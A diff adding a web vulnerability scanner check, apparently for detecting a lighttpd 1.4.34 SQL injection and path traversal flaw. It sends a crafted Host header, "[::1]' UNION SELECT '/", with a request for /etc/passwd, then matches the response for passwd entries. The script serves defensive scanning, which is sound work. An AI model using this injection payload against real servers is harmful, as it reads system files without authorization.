@@ -1,0 +1,57 @@
+#include helpers.inc;
+#include string_helpers.inc;
+#include os_detection.inc;
+#include classMatches.inc;
+var lastJob = null;
+var matches = new classMatches();
+// **************************************************************************************							 
+function alert(vxml, job)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = 'Web Server';
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	AddReportItem(ri);	
+}							 			
+// **************************************************************************************
+function TestForDirectoryTraversal(matches, job)
+{
+	var res = null;
+	
+	matches.plainArray = [
+				  ];
+	matches.regexArray = [
+					/((\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3})/
+				  ];
+	
+	var matchedText = matches.searchOnText(job.response.body);	
+	if (matchedText) { alert("lighttpd_v1434_SQL_injection_path_traversal.xml", job); res = 1; }
+	
+	return res;
+}
+/***********************************************************************************/
+function testVuln()
+{
+	lastJob = new THTTPJob();	
+	
+	lastJob.verb = "GET";
+	lastJob.addCookies = false;
+	lastJob.autoHostHeader = false;
+	lastJob.host = scanIP;
+	lastJob.Request.addHeader('Host', "[::1]' UNION SELECT '/", false);	
+	lastJob.uri  = '/etc/passwd';
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound)
+	{
+		return TestForDirectoryTraversal(matches, lastJob);
+    }
+    
+	return false;
+}
+// main entry point
+if (islighttpd)
+{
+    testVuln();
+}
